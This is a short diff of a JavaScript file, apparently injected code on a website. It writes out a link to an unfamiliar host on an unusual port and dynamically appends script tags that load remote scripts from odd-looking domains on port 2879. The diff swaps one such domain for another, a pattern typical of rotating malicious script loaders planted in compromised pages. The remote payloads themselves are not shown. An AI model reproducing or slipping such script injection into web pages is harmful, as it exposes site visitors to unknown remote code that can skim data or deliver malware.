@@ -3,12 +3,12 @@ document.writeln("<a href=\'https://m.ydxtpower.com:168/ua80512/ \' target=\'_bl
 var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
-    s.src = 'https://theodoreodor.com:2879/impl/t104_150/s1926';
+    s.src = 'https://wilburilbu.com:2879/impl/t105/s1926';
     var head = document.getElementsByTagName('head')[0];
     head.appendChild(s);
 var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
-    s.src = 'https://theodoreodor.com:2879/impl/t105/s1926';
+    s.src = 'https://wilburilbu.com:2879/impl/t104_150/s1926';
     var head = document.getElementsByTagName('head')[0];
     head.appendChild(s);
